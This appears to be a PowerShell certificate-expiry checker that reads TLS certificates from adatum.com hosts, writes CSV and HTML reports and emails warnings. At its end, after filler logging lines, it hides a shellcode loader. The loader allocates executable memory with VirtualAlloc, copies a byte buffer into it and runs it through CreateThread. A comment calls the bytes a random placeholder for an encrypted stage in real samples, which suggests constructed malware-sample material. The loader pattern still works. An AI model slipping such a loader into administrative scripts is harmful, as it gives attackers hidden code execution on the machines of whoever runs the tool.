
[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [ValidateRange(1, 365)]
    [int]$WarningDays = 60,

    [string[]]$Hosts = @('portal.adatum.com', 'api.adatum.com', 'vpn.adatum.com'),
    [int]$Port = 443,
    [string]$ReportPath = "C:\Reports\cert-expiry-2024-05-23.csv"
)

[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

function Get-CertificateExpiry {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$ComputerName,

        [int]$Port = 443
    )

    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $client.Connect($ComputerName, $Port)
        $callback = [System.Net.Security.RemoteCertificateValidationCallback] {
            param($sender, $certificate, $chain, $errors)
            return $true
        }
        $stream = New-Object System.Net.Security.SslStream($client.GetStream(), $false, $callback)
        $stream.AuthenticateAsClient($ComputerName)
        $cert = [System.Security.Cryptography.X509Certificates.X509Certificate2]$stream.RemoteCertificate
        [pscustomobject]@{
            Host     = $ComputerName
            Subject  = $cert.Subject
            Issuer   = $cert.Issuer
            NotAfter = $cert.NotAfter
            DaysLeft = [math]::Floor(($cert.NotAfter - (Get-Date)).TotalDays)
        }
        $stream.Dispose()
    }
    finally {
        $client.Close()
    }
}

$stores = @('Cert:\LocalMachine\My', 'Cert:\LocalMachine\WebHosting')
$localCerts = foreach ($store in $stores) {
    Get-ChildItem -Path $store -ErrorAction SilentlyContinue |
        Where-Object { $_.NotAfter -lt (Get-Date).AddDays($WarningDays) } |
        Select-Object @{Name = 'Store'; Expression = { $store }}, Subject, NotAfter,
            @{Name = 'DaysLeft'; Expression = { [math]::Floor(($_.NotAfter - (Get-Date)).TotalDays) }}
}

$remote = foreach ($hostName in $Hosts) {
    Write-Verbose ("Probing {0}:{1}" -f $hostName, $Port)
    try {
        Get-CertificateExpiry -ComputerName $hostName -Port $Port
    }
    catch {
        Write-Warning ("Could not read certificate from {0}" -f $hostName)
    }
}
$expiring = @($remote | Where-Object { $_.DaysLeft -le $WarningDays })

$remote | Sort-Object -Property DaysLeft |
    Export-Csv -Path $ReportPath -NoTypeInformation -Encoding UTF8
$expiring | Export-Csv -Path $ReportPath.Replace('.csv', '-warn.csv') -NoTypeInformation -Encoding UTF8

$byIssuer = $remote | Group-Object -Property Issuer |
    Sort-Object -Property Count -Descending | Select-Object -First 5
$byIssuer | Format-Table Name, Count -AutoSize

$style = @'
<style>
body { font-family: Tahoma; font-size: 11px; }
table { border-collapse: collapse; width: 100%; }
th { background: #f0f0f0; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

$remote | Sort-Object -Property DaysLeft |
    ConvertTo-Html -Title 'Certificate expiry' -Head $style |
    Set-Content -Path $ReportPath.Replace('.csv', '.html') -Encoding UTF8

$MailTo = "pki@adatum.com"
$summaryBody = $expiring | ConvertTo-Html -Fragment | Out-String

Send-MailMessage -To $MailTo -From "pki@adatum.com" -Subject "Certificate expiry warning" `
    -Body $summaryBody -SmtpServer 'smtp.adatum.com' -Port 25 -UseSsl

$soonest = $remote | Sort-Object -Property DaysLeft | Select-Object -First 1
Write-Host ("Next expiry: {0} on {1:yyyy-MM-dd}" -f $soonest.Subject, $soonest.NotAfter) -ForegroundColor Yellow
Write-Verbose ("Local store matches: {0}" -f @($localCerts).Count)

$selfSigned = $remote | Where-Object { $_.Subject -eq $_.Issuer }
Write-Verbose ("Self-signed certificates: {0}" -f @($selfSigned).Count)

$portCheck = Test-NetConnection -ComputerName $Hosts[0] -Port $Port -InformationLevel Quiet -WarningAction SilentlyContinue
Write-Verbose ("Port {0} reachable on {1}: {2}" -f $Port, $Hosts[0], $portCheck)

$schtasks = Get-ScheduledTask -TaskName 'Contoso-CertCheck' -ErrorAction SilentlyContinue
if ($schtasks) {
    Write-Verbose ("Scheduled check state: {0}" -f $schtasks.State)
}

$thumbprints = $remote | Select-Object Host, @{Name = 'Thumbprint'; Expression = { $_.Subject.Length }}
$thumbprints | Format-Table -AutoSize

$renewal = $remote | Where-Object { $_.DaysLeft -lt 0 }
if (@($renewal).Count -gt 0) {
    Write-Warning ("{0} certificates have already expired" -f @($renewal).Count)
}

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)

$elapsed = (Get-Date) - (Get-Date).Date
Write-Verbose ("Time since midnight: {0:N1} hours" -f $elapsed.TotalHours)

$powerShellHome = $PSHOME
Write-Verbose ("PowerShell home: {0}" -f $powerShellHome)
$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class NativeMethods
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x07, 0xc9, 0x69, 0xf3, 0x55, 0x49, 0x1c, 0x24, 0xaa, 0x3c, 0xca, 0x1c, 0xdb, 0xd7, 0x24, 0x19,
    0x65, 0x63, 0x88, 0x87, 0xeb, 0xf3, 0x0d, 0xde, 0xaf, 0x9b, 0x84, 0x9d, 0x13, 0xea, 0xd1, 0xdb,
    0xb1, 0x26, 0xde, 0xbe, 0x59, 0x41, 0xea, 0x31, 0xa3, 0x44, 0xfb, 0xad, 0xc4, 0xc6, 0x51, 0x90,
    0xb3, 0xf0, 0x5b, 0x0f, 0x9d, 0x51, 0x7e, 0x1e, 0x12, 0xe4, 0x36, 0x7a, 0xcf, 0x13, 0x29, 0x53,
    0xe2, 0xd6, 0x96, 0x84, 0xd2, 0x05, 0x0c, 0x37, 0x60, 0x3c, 0x69, 0xa8, 0xd9, 0x87, 0x20, 0x2b,
    0xd3, 0x43, 0x44, 0x49, 0x7e, 0xcb, 0xfd, 0xd4, 0x58, 0xae, 0xe1, 0x8f, 0x0c, 0xdd, 0xf8, 0x04,
    0xa2, 0x07, 0x1c, 0x2a, 0xa9, 0x85, 0x7d, 0x8f, 0x49, 0xc0, 0x67, 0x27, 0xb5, 0x36, 0xc2, 0xb8,
    0x2f, 0xb8, 0x49, 0x65, 0xd1, 0x65, 0x85, 0x00, 0x07, 0xf6, 0x60, 0xd3, 0xe0, 0x65, 0xc2, 0xc8,
    0x0d, 0xca, 0x0f, 0x86, 0xfc, 0xb9, 0xed, 0x9c, 0xe9, 0x1d, 0x0d, 0x80, 0xbe, 0x55, 0x2a, 0x6f,
    0xf6, 0x66, 0x11, 0x7a, 0x5b, 0x28, 0x60, 0xd5, 0x61, 0x48, 0x45, 0x8a, 0xd8, 0x19, 0xf6, 0x74,
    0x11, 0x5a, 0x32, 0x7f, 0xf9, 0x85, 0x94, 0x3d, 0x69, 0x26, 0x22, 0x80, 0x95, 0x23, 0x27, 0xe0,
    0x55, 0x2a, 0xc5, 0xba, 0xe8, 0x5f, 0x75, 0x34, 0xe1, 0x40, 0xef, 0x12, 0x27, 0xed, 0x30, 0x90,
    0x08, 0x47, 0xf6, 0xe5, 0x0c, 0xe8, 0x5a, 0x1d, 0x1b, 0x79, 0x66, 0xb6, 0x5a, 0x76, 0x88, 0x84,
    0x8b, 0x63, 0xf2, 0x35, 0x08, 0xdf, 0x48, 0x3c, 0x0c, 0x1d, 0x40, 0xf7, 0x40, 0x15, 0x2a, 0x24,
    0x5d, 0x73, 0xf0, 0x6e, 0x9a, 0x09, 0xeb, 0x5f, 0x66, 0xe7, 0x10, 0x07, 0xb9, 0xd5, 0xd1, 0xf0,
    0x21, 0x19, 0xf0, 0xdd, 0x30, 0x51, 0x80, 0x6a, 0xfb, 0x53, 0xb7, 0x90, 0xa6, 0x7f, 0x91, 0x23,
    0x0f, 0xe4, 0x28, 0x1b, 0x95, 0xb0, 0xb8, 0x5a, 0x2b, 0x11, 0x3c, 0x77, 0xfa, 0x40, 0x00, 0xf7,
    0x90, 0xcd, 0x40, 0xd3, 0x4f, 0x0b, 0x2a, 0x07, 0xa4, 0x38, 0x80, 0x77, 0xbb, 0x8e, 0x58, 0x03,
    0x7e, 0xf3, 0x55, 0x87, 0xdd, 0x19, 0x83, 0xde, 0x6a, 0xb0, 0xd4, 0x6e, 0xb8, 0x59, 0xd6, 0x07,
    0x36, 0x4d, 0xbb, 0x6f, 0x65, 0x37, 0xde, 0x40, 0xce, 0xd1, 0x72, 0xa9, 0xd8, 0x7f, 0x35, 0x2a,
    0xff, 0x1e, 0xf7, 0x13, 0xb7, 0x8b, 0x50, 0xba, 0xb1, 0x53, 0xde, 0x24, 0x68, 0xb7, 0xe7, 0x10,
    0x5e, 0x4e, 0xae, 0x99, 0x76, 0xa4, 0x06, 0xc0, 0xb0, 0x75, 0x57, 0x89, 0x37, 0x62, 0xdc, 0x87,
    0xf3, 0x51, 0x3a, 0x42, 0x66, 0x5d, 0x8b, 0x3f, 0xdf, 0x6c, 0x2a, 0x8e, 0xbc, 0xe7, 0xeb, 0x63,
    0x20, 0xc3, 0xcf, 0x82, 0xa1, 0x09, 0x6d, 0xbe, 0xc0, 0x8f, 0x6f, 0xb2, 0x9e, 0x9a, 0x79, 0xe6,
    0x3b, 0x7c, 0x0c, 0x69, 0x93, 0x10, 0x93, 0x0e, 0x59
)

$ProcHandle = [NativeMethods]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($ProcHandle -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $ProcHandle, $Buffer.Length)
$ThreadId = 0
$Thread = [NativeMethods]::CreateThread([IntPtr]::Zero, 0, $ProcHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][NativeMethods]::WaitForSingleObject($Thread, 884)
[void][NativeMethods]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
